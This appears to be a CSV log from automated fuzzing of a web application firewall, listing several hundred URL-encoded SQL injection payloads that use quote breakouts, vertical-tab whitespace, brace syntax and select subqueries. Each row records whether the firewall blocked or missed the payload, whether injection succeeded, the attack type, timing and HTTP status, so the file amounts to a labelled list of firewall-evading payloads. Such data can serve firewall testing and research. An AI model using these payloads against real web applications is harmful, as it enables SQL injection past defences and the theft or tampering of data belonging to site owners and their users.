Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code
0'<@=1.+or+!%0btrue=,Bypassed,No,None,booleanAtk,0.0167,71.04,No,500
0'<@!=.1+or%0bnot+{x%0b,Bypassed,No,None,Unknown,0.0145,71.04,No,500
0'<@=1+||+!%0b{x%0b,Bypassed,No,None,Unknown,0.0144,71.16,No,500
0'<@=1.+||+!+{x+,Bypassed,No,None,Unknown,0.0091,71.29,No,500
0%27<@=1+or+{a+1}=1+like,Bypassed,Yes,unionAtk,Unknown,0.0125,71.52,No,200
0'<@=1%0bor+not%0b{a%0b,Bypassed,No,None,Unknown,0.0173,71.66,No,500
0'<@!=1+||%0b!+{`if`,Bypassed,No,None,Unknown,0.0089,71.8,No,500
0%27<@=1.%0bor+{x+(select+1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0124,71.8,No,200
0'<@!=1+||%0bnot%0b{x%0b,Bypassed,No,None,Unknown,0.0178,71.8,No,500
0%27<@=.1%0bor%0b!%0b{`if`%0b,Bypassed,Yes,unionAtk,Unknown,0.0186,71.04,No,200
0%27<@!=.1+or%0b!%0b{`if`%0b,Bypassed,Yes,unionAtk,Unknown,0.0144,71.04,No,200
0%27<@!=1+or%0bnot+{x+,Bypassed,Yes,unionAtk,Unknown,0.02,71.04,No,200
0'||%0b@<@.+||%0b!+,Bypassed,No,None,Unknown,0.0168,71.04,No,500
0%27<@=.1%0b||%0b!+{x%0b,Bypassed,Yes,unionAtk,Unknown,0.0137,71.04,No,200
0%27<@!=.1%0b||%0bnot%0btrue=,Bypassed,Yes,unionAtk,Unknown,0.02,71.04,No,200
0'<@=1.+||%0bnot+1=,Bypassed,No,None,Unknown,0.0178,71.04,No,500
0'||%0b!@<@.+or+!%0b,Bypassed,No,None,Unknown,0.0192,71.04,No,500
0'<@!=1.+||+!%0b1=,Bypassed,No,None,Unknown,0.017,71.04,No,500
0'<@=1.+or%0b{x%0b(select+1)}=1,Bypassed,No,None,Unknown,0.0293,71.04,No,500
0%27<@=1+||%0bnot~false=,Bypassed,Yes,unionAtk,Unknown,0.0284,71.04,No,200
0%27<@!=1.%0b||+not%0b{a+,Bypassed,Yes,unionAtk,Unknown,0.0127,71.04,No,200
0%27<@!=1%0bor%0bnot%0b{x%0b,Bypassed,Yes,unionAtk,Unknown,0.0289,71.04,No,200
0'<@=1.+||+!+true=,Bypassed,No,None,Unknown,0.0162,71.04,No,500
0'<@!=.1%0bor+not+{`if`%0b,Bypassed,No,None,Unknown,0.021,71.04,No,500
0'<@!=1+||+!+true=,Bypassed,No,None,Unknown,0.0185,71.04,No,500
0%27<@!=1%0bor+not+{a,Bypassed,Yes,unionAtk,Unknown,0.0161,71.04,No,200
0'<@!=1.+or+not+{x%0b,Bypassed,No,None,Unknown,0.0193,71.04,No,500
0'<@!=.1%0bor%0b!%0b{`if`%0b,Bypassed,No,None,Unknown,0.0167,71.04,No,500
0'<@=1+||%0b!+{x%0b,Bypassed,No,None,Unknown,0.0113,71.04,No,500
0%27<@!=1+||%0bfalse=+,Bypassed,Yes,unionAtk,Unknown,0.0135,71.04,No,200
0%27<@=.1+||%0b!+true=,Bypassed,Yes,unionAtk,Unknown,0.012,71.04,No,200
0%27<@=1.+or%0bnot+{`if`%0b,Bypassed,Yes,unionAtk,Unknown,0.0133,71.04,No,200
0%27<@=1+or%0b!%0b{x+,Bypassed,Yes,unionAtk,Unknown,0.0111,71.04,No,200
0%27<@=.1+or%0bnot+true=,Bypassed,Yes,unionAtk,booleanAtk,0.0346,71.04,No,200
0%27<@=.1+||%0bnot+{x%0b,Bypassed,Yes,unionAtk,Unknown,0.0169,71.04,No,200
0'<@=1+or%0b!+{`if`+,Bypassed,No,None,Unknown,0.0229,71.04,No,500
0%27<@=.1%0bor%0bnot+{x%0b,Bypassed,Yes,unionAtk,Unknown,0.0161,71.04,No,200
0'<@!=1%0bor+not%0b1=,Bypassed,No,None,Unknown,0.0118,71.04,No,500
0'<@!=.1%0bor+false=%0b(,Bypassed,No,None,booleanAtk,0.0159,71.04,No,500
0%27<@=1+||+not+{`if`+,Bypassed,Yes,unionAtk,Unknown,0.0178,71.04,No,200
0'<@=1.%0b||%0bnot%0b{x+,Bypassed,No,None,Unknown,0.0105,71.04,No,500
0%27<@!=1.+or+not%0b{`if`+,Bypassed,Yes,unionAtk,Unknown,0.0254,71.04,No,200
0%27<@=1.%0b||%0bnot+{`if`+,Bypassed,Yes,unionAtk,Unknown,0.0127,71.04,No,200
0%27<@!=1.+||+!+{x%0b,Bypassed,Yes,unionAtk,Unknown,0.0136,71.04,No,200
0%27<@=1.+||%0b!+{`if`%0b,Bypassed,Yes,unionAtk,Unknown,0.0129,71.04,No,200
0'<@!=1+or+!%0b{`if`,Bypassed,No,None,Unknown,0.0156,71.04,No,500
0%27<@!=.1+||+not+{x+,Bypassed,Yes,unionAtk,Unknown,0.016,71.04,No,200
0%27<@!=1.%0b||+!+{`if`+,Bypassed,Yes,unionAtk,Unknown,0.017,71.04,No,200
0'or+@<@.%0bor%0b!+,Bypassed,No,None,Unknown,0.0093,71.04,No,500
0'<@=1.%0bor+!%7efalse=,Bypassed,No,None,booleanAtk,0.01,71.04,No,500
0'<@=1+||+!~false=,Bypassed,No,None,Unknown,0.0114,71.04,No,500
0%27<@=1+or%0b0=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0176,71.04,No,200
0%27<@=.1+or+not%0b{`if`%0b,Bypassed,Yes,unionAtk,Unknown,0.0169,71.04,No,200
0%27<@!=.1%0b||+!+{x,Bypassed,Yes,unionAtk,Unknown,0.0136,71.16,No,200
0%27<@!=.1%0bor+!+true=,Bypassed,Yes,unionAtk,booleanAtk,0.0152,71.4,No,200
0'<@!=1+or+not+{x%0b,Bypassed,No,None,Unknown,0.0093,71.52,No,500
0%27<@!=1.%0b||%0bnot%0b{x+,Bypassed,Yes,unionAtk,Unknown,0.0117,71.76,No,200
0'<@=1%0bor+not+{x%0b,Bypassed,No,None,Unknown,0.0117,71.8,No,500
0%27<@=1.+||%0bnot%0b{x+,Bypassed,Yes,unionAtk,Unknown,0.0152,71.8,No,200
0%27<@=1+or%0bnot+{`if`,Bypassed,Yes,unionAtk,Unknown,0.0151,71.04,No,200
0%27<@=.1+or+not%0b{x%0b,Bypassed,Yes,unionAtk,Unknown,0.0172,71.04,No,200
0'<@!=.1+or+!%0b{x+,Bypassed,No,None,Unknown,0.0155,71.04,No,500
0'<@=1%0bor%0bnot%7efalse=,Bypassed,No,None,booleanAtk,0.0172,71.04,No,500
0%27<@=.1%0b||+not+{`if`+,Bypassed,Yes,unionAtk,Unknown,0.0229,71.04,No,200
0'<@=.1%0bor%0bnot+{x+,Bypassed,No,None,Unknown,0.0128,71.04,No,500
0%27<@!=1.+or%0bnot%0b{x,Bypassed,Yes,unionAtk,Unknown,0.0272,71.04,No,200
0%27<@=1.%0b||%0bnot+{x%0b,Bypassed,Yes,unionAtk,Unknown,0.0152,71.04,No,200
0'<@!=1.+or+not+{x,Bypassed,No,None,Unknown,0.0187,71.04,No,500
0'<@!=.1+or+not+{a,Bypassed,No,None,Unknown,0.0141,71.04,No,500
0%27<@!=1.+or%0bnot+{x+,Bypassed,Yes,unionAtk,Unknown,0.0205,71.04,No,200
0%27<@=.1+||%0bnot+1=,Bypassed,Yes,unionAtk,Unknown,0.0114,71.04,No,200
0%27or+1<@+or%0bnot%0b,Bypassed,Yes,unionAtk,Unknown,0.0239,71.04,No,200
0%27<@=1%0bor%0b!~false=,Bypassed,Yes,unionAtk,booleanAtk,0.0183,71.04,No,200
0'<@!=1+||+!+{x+,Bypassed,No,None,Unknown,0.0198,71.04,No,500
0'<@!=.1%0b||+not+{x,Bypassed,No,None,Unknown,0.0159,71.04,No,500
0%27<@=1%0bor+!%0b{x%0b,Bypassed,Yes,unionAtk,Unknown,0.0136,71.04,No,200
0'<@=1.%0bor+not+true=,Bypassed,No,None,booleanAtk,0.0211,71.04,No,500
0'<@=1.+or+{`if`+1}=1+like,Bypassed,No,None,Unknown,0.0201,71.04,No,500
0'or%0b@<@.%0b||+not%0b,Bypassed,No,None,Unknown,0.0206,71.04,No,500
0'<@=1%0b||+!%7e0=,Bypassed,No,None,Unknown,0.0175,71.04,No,500
0%27<@!=.1+or+!+{x+,Bypassed,Yes,unionAtk,Unknown,0.0246,71.04,No,200
0'<@=1%0b||+not%0b{a%0b,Bypassed,No,None,Unknown,0.0174,71.04,No,500
0%27<@!=.1+||+!+{x+,Bypassed,Yes,unionAtk,Unknown,0.0183,71.04,No,200
0%27<@=1%0bor+not+{x+,Bypassed,Yes,unionAtk,Unknown,0.0142,71.04,No,200
0%27<@!=1.+or+!+{x,Bypassed,Yes,unionAtk,Unknown,0.0171,71.04,No,200
0'<@=1.+or%0bnot+{x+,Bypassed,No,None,Unknown,0.0151,71.04,No,500
0%27<@=1%0b||+not+{x+,Bypassed,Yes,unionAtk,Unknown,0.0151,71.04,No,200
0'<@!=1.%0bor+not+{x%0b,Bypassed,No,None,Unknown,0.0238,71.04,No,500
0%27<@!=.1%0bor+!+{x+,Bypassed,Yes,unionAtk,Unknown,0.0237,71.04,No,200
0%27<@=1.+||+not%0b{x%0b,Bypassed,Yes,unionAtk,Unknown,0.0179,71.04,No,200
0'<@=1%0b||+not+{x%0b,Bypassed,No,None,Unknown,0.0093,71.04,No,500
0%27<@!=.1+||%0bnot+{a%0b,Bypassed,Yes,unionAtk,Unknown,0.02,71.04,No,200
0%27<@=1.%0b||+not%0b{x+,Bypassed,Yes,unionAtk,Unknown,0.0143,71.04,No,200
0%27<@!=1%0bor+not%0btrue=,Bypassed,Yes,unionAtk,booleanAtk,0.0168,71.04,No,200
0%27<@!=.1%0b||%0b!+1=,Bypassed,Yes,unionAtk,Unknown,0.0104,71.04,No,200
0'<@!=1.+||+!%0btrue=,Bypassed,No,None,Unknown,0.0187,71.04,No,500
0'<@!=.1%0bor%0bnot+{`if`+,Bypassed,No,None,Unknown,0.0128,71.04,No,500
0'<@=1+or%0b!%0b{x,Bypassed,No,None,Unknown,0.0081,71.04,No,500
0'<@=1.+or%0b!+{x+,Bypassed,No,None,Unknown,0.0123,71.04,No,500
0%27<@=1+or+not+{x+,Bypassed,Yes,unionAtk,Unknown,0.0149,71.04,No,200
0%27<@=1.%0b||%0b!+{x%0b,Bypassed,Yes,unionAtk,Unknown,0.0147,71.04,No,200
0%27or+@<@.+or+!+,Bypassed,Yes,unionAtk,Unknown,0.0085,71.04,No,200
0'<@=1%0b||+0=+(,Bypassed,No,None,Unknown,0.0136,71.04,No,500
0%27<@=1.+||%0bnot+{x+,Bypassed,Yes,unionAtk,Unknown,0.0124,71.04,No,200
0'<@!=1+or%0btrue+like%0b,Bypassed,No,None,booleanAtk,0.0064,71.29,No,500
0%27<@=.1%0b||+not+{x+,Bypassed,Yes,unionAtk,Unknown,0.013,71.52,No,200
0'<@=.1%0bor+!+{`if`+,Bypassed,No,None,Unknown,0.0076,71.52,No,500
0%27<@!=1.+or+not%0b{a+,Bypassed,Yes,unionAtk,Unknown,0.0178,71.66,No,200
0%27<@=.1%0bor+!%0b{x+,Bypassed,Yes,unionAtk,Unknown,0.0112,71.8,No,200
0%27<@=1+or+{x+(select%0b1)}=1,Blocked,No,None,Unknown,0.0156,71.04,No,403
0%27<@=1%0bor+not%0b{x%0b,Bypassed,Yes,unionAtk,Unknown,0.0201,71.04,No,200
0%27<@=.1+or%0bnot+{x+,Bypassed,Yes,unionAtk,Unknown,0.0111,71.04,No,200
0%27<@=.1+||%0b{x%0b(select%0b1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0115,71.04,No,200
0%27<@!=1+or+!+{x%0b,Bypassed,Yes,unionAtk,Unknown,0.0243,71.04,No,200
0%27<@!=1+||+{a+1}=1%0blike,Bypassed,Yes,unionAtk,Unknown,0.0162,71.04,No,200
0%27<@=.1+or%0b{`if`+1}=1+,Bypassed,Yes,unionAtk,Unknown,0.025,71.04,No,200
0'<@!=1.+or%0b{x+(select+1)}=1,Bypassed,No,None,Unknown,0.0198,71.04,No,500
0%27<@=1.+||%0b!%0b{x%0b,Bypassed,Yes,unionAtk,Unknown,0.0183,71.04,No,200
0%27<@!=1.+||%0b!%0b{a,Bypassed,Yes,unionAtk,Unknown,0.0182,71.04,No,200
0%27<@!=1+||+!+{x+,Bypassed,Yes,unionAtk,Unknown,0.0136,71.04,No,200
0%27<@!=.1+||+!%0btrue=,Bypassed,Yes,unionAtk,Unknown,0.0225,71.04,No,200
0'<@!=.1+||%0bnot%0b{x+,Bypassed,No,None,Unknown,0.0166,71.04,No,500
0%27<@!=.1+or%0bnot%0b{x+,Bypassed,Yes,unionAtk,Unknown,0.0245,71.04,No,200
0%27<@=.1%0bor+not+{a+,Bypassed,Yes,unionAtk,Unknown,0.0156,71.04,No,200
0'<@!=1+or+!%0b{`if`+,Bypassed,No,None,Unknown,0.0187,71.04,No,500
0'<@!=1+or%0bnot+true=,Bypassed,No,None,booleanAtk,0.0202,71.04,No,500
0%27<@!=1%0b||+!+true=,Bypassed,Yes,unionAtk,Unknown,0.0126,71.04,No,200
0%27<@=1.+||%0bnot+{`if`+,Bypassed,Yes,unionAtk,Unknown,0.0201,71.04,No,200
0%27<@!=.1+or%0bnot+{x+,Bypassed,Yes,unionAtk,Unknown,0.0219,71.04,No,200
0'<@=.1%0bor%0b{`if`%0b1}=1+like,Bypassed,No,None,Unknown,0.0115,71.04,No,500
0%27<@=.1+||+not%0btrue=,Bypassed,Yes,unionAtk,Unknown,0.0073,71.04,No,200
0%27<@!=1+||%0bnot%0b{x+,Bypassed,Yes,unionAtk,Unknown,0.0111,71.04,No,200
0'<@!=1%0b||+!%0b{x,Bypassed,No,None,Unknown,0.0164,71.04,No,500
0%27or+!@<@.+or+!%0b,Bypassed,Yes,unionAtk,Unknown,0.0198,71.04,No,200
0%27<@!=1.+||%0bnot%0b{`if`%0b,Bypassed,Yes,unionAtk,Unknown,0.0141,71.04,No,200
0'<@!=.1%0bor+!+{x+,Bypassed,No,None,Unknown,0.0157,71.04,No,500
0%27<@=1%0b||%0b0=+(,Bypassed,Yes,unionAtk,Unknown,0.013,71.04,No,200
0'<@=1.%0b||%0b!%0b{x+,Bypassed,No,None,Unknown,0.0144,71.04,No,500
0%27<@=1%0bor+not+{x+,Bypassed,Yes,unionAtk,Unknown,0.0108,71.04,No,200
0'<@!=1.+||+!+{x%0b,Bypassed,No,None,Unknown,0.0193,71.04,No,500
0%27<@=.1%0b||%0bnot%0btrue=,Bypassed,Yes,unionAtk,Unknown,0.0108,71.04,No,200
0'<@=1.+or+!+{x,Bypassed,No,None,Unknown,0.0163,71.04,No,500
0'<@=1.+||+!+{x+,Bypassed,No,None,Unknown,0.0121,71.04,No,500
0%27<@!=.1+or%0bnot+{x+,Bypassed,Yes,unionAtk,Unknown,0.0216,71.04,No,200
0'<@=1%0bor%0b!%0b{`if`+,Bypassed,No,None,Unknown,0.0126,71.04,No,500
0%27<@=1+or+!+{`if`+,Bypassed,Yes,unionAtk,Unknown,0.0161,71.04,No,200
0'<@=1%0b||%0bnot%0b{x%0b,Bypassed,No,None,Unknown,0.0147,71.04,No,500
0'<@=.1+||%0b{x%0b(select%0b1)}=1,Bypassed,No,None,Unknown,0.0117,71.04,No,500
0%27<@=1.%0b||%0b!+true=,Bypassed,Yes,unionAtk,Unknown,0.0105,71.04,No,200
0'<@!=.1%0bor+not%0b{a%0b,Bypassed,No,None,Unknown,0.0161,71.04,No,500
0'<@!=.1%0b||+{x+(select+1)}=1,Bypassed,No,None,Unknown,0.022,71.04,No,500
0%27<@=1+||%0b!+{x+,Bypassed,Yes,unionAtk,Unknown,0.0153,71.16,No,200
0%27<@=.1%0bor%0bnot+{a,Bypassed,Yes,unionAtk,Unknown,0.0125,71.4,No,200
0'<@=1%0bor+not+1=,Bypassed,No,None,Unknown,0.0088,71.52,No,500
0%27<@=1.+or+!+{`if`,Bypassed,Yes,unionAtk,Unknown,0.0128,71.76,No,200
0%27<@!=.1%0b||+!+{x+,Bypassed,Yes,unionAtk,Unknown,0.0194,71.8,No,200
0%27<@!=.1+||%0b!+{x,Bypassed,Yes,unionAtk,Unknown,0.0186,71.8,No,200
0%27<@=1.+or+!+{x%0b,Bypassed,Yes,unionAtk,Unknown,0.0139,71.8,No,200
0'<@!=1%0b||+not%7efalse=,Bypassed,No,None,Unknown,0.0148,71.8,No,500
0%27<@!=1+||+!%0btrue=,Bypassed,Yes,unionAtk,Unknown,0.0169,71.04,No,200
0'<@!=1+or%0bnot+{`if`+,Bypassed,No,None,Unknown,0.016,71.04,No,500
0%27<@=1.%0b||+!%0b{a+,Bypassed,Yes,unionAtk,Unknown,0.0177,71.04,No,200
0'<@!=.1+||%0b!%0b{x%0b,Bypassed,No,None,Unknown,0.0117,71.04,No,500
0%27<@!=1+or+not+{x%0b,Bypassed,Yes,unionAtk,Unknown,0.0114,71.04,No,200
0'<@=1.%0bor+!%0b{a+,Bypassed,No,None,Unknown,0.0137,71.04,No,500
0%27<@=1.%0bor+!%0btrue=,Bypassed,Yes,unionAtk,booleanAtk,0.0111,71.04,No,200
0%27<@=.1%0bor+not+{`if`,Bypassed,Yes,unionAtk,Unknown,0.0154,71.04,No,200
0%27<@=1+or+!%0b{x+,Bypassed,Yes,unionAtk,Unknown,0.0151,71.04,No,200
0%27<@!=1+||%0b!%0b{x,Bypassed,Yes,unionAtk,Unknown,0.0146,71.04,No,200
0'<@=1+||%0bnot%7efalse=,Blocked,No,None,Unknown,0.0185,71.04,No,403
0'<@!=1+||%0b!+{x+,Bypassed,No,None,Unknown,0.0274,71.04,No,500
0%27<@=1.+||+!+{x,Bypassed,Yes,unionAtk,Unknown,0.0299,71.04,No,200
0'<@!=1.%0bor+!+{x+,Bypassed,No,None,Unknown,0.0158,71.04,No,500
0'<@=1.+||%0b!%0b{x+,Bypassed,No,None,Unknown,0.0201,71.04,No,500
0'<@!=1+||%0b!+{x,Bypassed,No,None,Unknown,0.014,71.04,No,500
0%27<@=.1+or+!%0b{x+,Bypassed,Yes,unionAtk,Unknown,0.0213,71.04,No,200
0%27<@=1.+or%0b!%0b{x,Bypassed,Yes,unionAtk,Unknown,0.0222,71.04,No,200
0%27<@!=.1%0bor+not%0btrue=,Bypassed,Yes,unionAtk,booleanAtk,0.025,71.04,No,200
0'<@!=.1+or+!~false=,Bypassed,No,None,booleanAtk,0.013,71.04,No,500
0'or%0b1<@+||+!%0b,Bypassed,No,None,Unknown,0.0199,71.04,No,500
0%27<@=.1%0b||+not+1=,Bypassed,Yes,unionAtk,Unknown,0.0119,71.04,No,200
0%27<@!=.1%0b||+false=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0128,71.04,No,200
0'<@=.1%0b||%0b!%0b{x+,Bypassed,No,None,Unknown,0.0179,71.04,No,500
0'<@!=1%0bor%0b!+{`if`+,Bypassed,No,None,Unknown,0.0134,71.04,No,500
0'<@=1.+||+!+{`if`%0b,Bypassed,No,None,Unknown,0.0235,71.04,No,500
0%27<@!=1.+or+not+{x,Bypassed,Yes,unionAtk,Unknown,0.0222,71.04,No,200
0%27<@!=1.+||+not%0b{x,Bypassed,Yes,unionAtk,Unknown,0.015,71.04,No,200
0'||+1<@+||+{`if`+1}=1,Bypassed,No,None,Unknown,0.0136,71.04,No,500
0%27<@!=.1%0b||%0b!%0b{x+,Bypassed,Yes,unionAtk,Unknown,0.0191,71.04,No,200
0%27<@!=1.+or+not%0btrue=,Bypassed,Yes,unionAtk,booleanAtk,0.0105,71.04,No,200
0'<@=1%0bor+0=%0b,Bypassed,No,None,Unknown,0.0092,71.04,No,500
0'<@!=1.%0b||+!%7e0=,Bypassed,No,None,Unknown,0.0103,71.04,No,500
0%27<@=1+or+not+1=,Bypassed,Yes,unionAtk,Unknown,0.0179,71.04,No,200
0%27<@!=.1%0bor+not%0btrue=,Bypassed,Yes,unionAtk,booleanAtk,0.0114,71.04,No,200
0'<@=1%0bor+!+1=,Bypassed,No,None,Unknown,0.0157,71.04,No,500
0%27<@!=.1%0b||+not+{x%0b,Bypassed,Yes,unionAtk,Unknown,0.0118,71.04,No,200
0%27<@=1%0b||%0bnot+{a+,Bypassed,Yes,unionAtk,Unknown,0.0116,71.04,No,200
0'<@=1.%0b||%0bnot%0b{x%0b,Bypassed,No,None,Unknown,0.0186,71.04,No,500
0%27<@=.1+or%0bnot+{`if`,Bypassed,Yes,unionAtk,Unknown,0.011,71.04,No,200
0'<@=.1%0b||%0b!%0b{a+,Bypassed,No,None,Unknown,0.0104,71.04,No,500
0%27<@=.1%0b||+{a+1}=1+like,Bypassed,Yes,unionAtk,Unknown,0.0197,71.04,No,200
0%27<@!=1.%0b||%0b!+{x+,Bypassed,Yes,unionAtk,Unknown,0.0169,71.16,No,200
0%27<@=1.+or%0bnot%0b{x%0b,Bypassed,Yes,unionAtk,Unknown,0.011,71.4,No,200
0%27<@=.1%0bor%0bnot+true=,Bypassed,Yes,unionAtk,booleanAtk,0.0163,71.52,No,200
0%27<@!=1.%0bor+!~false=,Bypassed,Yes,unionAtk,booleanAtk,0.0098,71.62,No,200
0%27<@!=.1+||+!+{a+,Bypassed,Yes,unionAtk,Unknown,0.0142,71.8,No,200
0'<@=1.%0b||+!%0b{x+,Bypassed,No,None,Unknown,0.0196,71.8,No,500
0%27<@!=1.+or+not+{a,Bypassed,Yes,unionAtk,Unknown,0.0167,71.8,No,200
0%27<@!=1.%0b||+not%0b1=,Bypassed,Yes,unionAtk,Unknown,0.0213,71.8,No,200
0%27<@!=1.+||+not+{x+,Bypassed,Yes,unionAtk,Unknown,0.0177,71.8,No,200
0'or+1<@%0b||+1+,Bypassed,No,None,Unknown,0.0187,71.8,No,500
0%27<@=1%0b||%0bnot%0b{x+,Bypassed,Yes,unionAtk,Unknown,0.0179,71.8,No,200
0%27<@=.1+||%0bnot%0b{`if`,Bypassed,Yes,unionAtk,Unknown,0.0168,71.8,No,200
0'<@!=.1%0bor+!%0b{`if`%0b,Bypassed,No,None,Unknown,0.0199,71.8,No,500
0%27<@!=1+||+not+{`if`,Bypassed,Yes,unionAtk,Unknown,0.0114,71.8,No,200
0%27<@!=.1%0b||+not+{`if`%0b,Bypassed,Yes,unionAtk,Unknown,0.0188,71.8,No,200
0%27<@=1.%0bor+not+{x+,Bypassed,Yes,unionAtk,Unknown,0.016,71.8,No,200
0%27<@=1.%0b||+!%7efalse=,Bypassed,Yes,unionAtk,Unknown,0.0188,71.8,No,200
0%27<@!=1+or%0b!+{a+,Bypassed,Yes,unionAtk,Unknown,0.0256,71.8,No,200
0%27<@=1.+||%0bnot+1=,Bypassed,Yes,unionAtk,Unknown,0.0177,71.8,No,200
0%27<@!=.1+or+!+{`if`%0b,Bypassed,Yes,unionAtk,Unknown,0.0175,71.8,No,200
0'<@=1.%0b||+!+{x+,Bypassed,No,None,Unknown,0.0247,71.8,No,500
0%27or%0b!@<@.+or%0b!%0b,Bypassed,Yes,unionAtk,Unknown,0.0141,71.8,No,200
0'<@!=1.%0bor+!+{x+,Bypassed,No,None,Unknown,0.012,71.8,No,500
0'<@!=1.+||%0bnot+{a,Bypassed,No,None,Unknown,0.021,71.8,No,500
0%27<@!=1%0b||%0bnot+{a%0b,Bypassed,Yes,unionAtk,Unknown,0.0251,71.8,No,200
0%27<@!=1.+||+not+{x%0b,Bypassed,Yes,unionAtk,Unknown,0.0166,71.8,No,200
0'<@!=.1+||%0b!%0btrue=,Blocked,No,None,Unknown,0.0141,71.8,No,403
0'<@=1+||%0bnot%0b{a%0b,Bypassed,No,None,Unknown,0.0168,71.8,No,500
0'<@!=.1%0b||%0bnot+{x%0b,Bypassed,No,None,Unknown,0.0169,71.8,No,500
0'<@!=.1+or+not+true=,Bypassed,No,None,booleanAtk,0.0116,71.8,No,500
0%27or%0b@<@%0bor%0b!+,Bypassed,Yes,unionAtk,Unknown,0.0162,71.8,No,200
0%27<@!=1+or%0b{x+(select%0b1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0221,71.8,No,200
0%27<@=.1%0bor+not%0b{a%0b,Bypassed,Yes,unionAtk,Unknown,0.023,71.8,No,200
0%27<@=1+||+not+{x%0b,Bypassed,Yes,unionAtk,Unknown,0.0153,71.8,No,200
0'<@!=.1+or%0b{x+(select%0b1)}=1,Bypassed,No,None,Unknown,0.0201,71.8,No,500
0'<@!=1%0bor+not+{x+,Bypassed,No,None,Unknown,0.0176,71.8,No,500
0%27<@=.1+or%0b!%7efalse=,Bypassed,Yes,unionAtk,booleanAtk,0.0143,71.8,No,200
0%27<@=1.+or+!%0b1=,Bypassed,Yes,unionAtk,Unknown,0.015,71.92,No,200
0%27<@=1+or+not+{`if`%0b,Bypassed,Yes,unionAtk,Unknown,0.013,72.05,No,200
0%27<@!=1+or%0b!+1=,Bypassed,Yes,unionAtk,Unknown,0.0221,72.05,No,200
0'<@!=.1+||%0b!%0b{a+,Bypassed,No,None,Unknown,0.0355,72.05,No,500
0'<@!=1%0bor%0bnot+true=,Bypassed,No,None,booleanAtk,0.0212,72.05,No,500
0%27<@!=.1%0bor+!%0btrue=,Bypassed,Yes,unionAtk,booleanAtk,0.0117,72.05,No,200
0'<@!=1.+or%0b!+{a%0b,Bypassed,No,None,Unknown,0.0214,72.05,No,500
0%27or+@<@.%0b||+not%0b,Bypassed,Yes,unionAtk,Unknown,0.016,72.05,No,200
0'<@=1.%0b||+not%0b{x%0b,Bypassed,No,None,Unknown,0.0155,72.05,No,500
0%27<@!=.1%0b||+not+{x+,Bypassed,Yes,unionAtk,Unknown,0.0148,72.05,No,200
0%27<@!=.1%0bor%0bnot%0b1=,Bypassed,Yes,unionAtk,Unknown,0.0081,72.05,No,200
0%27<@=.1+or%0b!+{x%0b,Bypassed,Yes,unionAtk,Unknown,0.0133,72.05,No,200
0'<@!=1.%0bor+!+{x,Bypassed,No,None,Unknown,0.0129,72.05,No,500
0%27<@=1.%0bor+!+1=,Bypassed,Yes,unionAtk,Unknown,0.0095,72.05,No,200
0'<@=.1+or+{`if`%0b1}=1%0blike,Bypassed,No,None,Unknown,0.0147,72.05,No,500
0%27<@=1.%0bor%0bnot+{x%0b,Bypassed,Yes,unionAtk,Unknown,0.0099,72.05,No,200
0%27<@=.1+or+false=+,Bypassed,Yes,unionAtk,booleanAtk,0.0152,72.05,No,200
0'<@=.1%0b||+{x+(select+1)}=1,Bypassed,No,None,Unknown,0.0142,72.05,No,500
0%27<@!=1+or%0bnot%0b{x+,Bypassed,Yes,unionAtk,Unknown,0.0068,72.05,No,200
0%27<@!=1+or+!%7efalse=,Bypassed,Yes,unionAtk,booleanAtk,0.012,72.05,No,200
0%27<@!=1.%0b||+!+{x,Bypassed,Yes,unionAtk,Unknown,0.0105,72.05,No,200
0%27<@!=1%0b||%0bnot+{`if`+,Bypassed,Yes,unionAtk,Unknown,0.0228,71.8,No,200
0'<@=1+or+!+{x+,Bypassed,No,None,Unknown,0.0207,71.8,No,500
5%27+||%0b{x%0b(select%0b1)}=1,Blocked,No,None,Unknown,0.0141,71.8,No,403
0'<@=1+or%0b!%0b{x%0b,Bypassed,No,None,Unknown,0.0178,71.8,No,500
0%27<@=1.+or%0bnot%0b{`if`%0b,Bypassed,Yes,unionAtk,Unknown,0.0115,71.8,No,200
0'<@!=.1%0bor%0bnot+{x%0b,Bypassed,No,None,Unknown,0.0179,71.8,No,500
0'<@=1+||+not+{`if`+,Bypassed,No,None,Unknown,0.021,71.8,No,500
0'<@=1.+or+!+{x+,Bypassed,No,None,Unknown,0.0196,71.8,No,500
0%27<@=1+or%0b0=%0b(,Bypassed,Yes,unionAtk,Unknown,0.0245,71.8,No,200
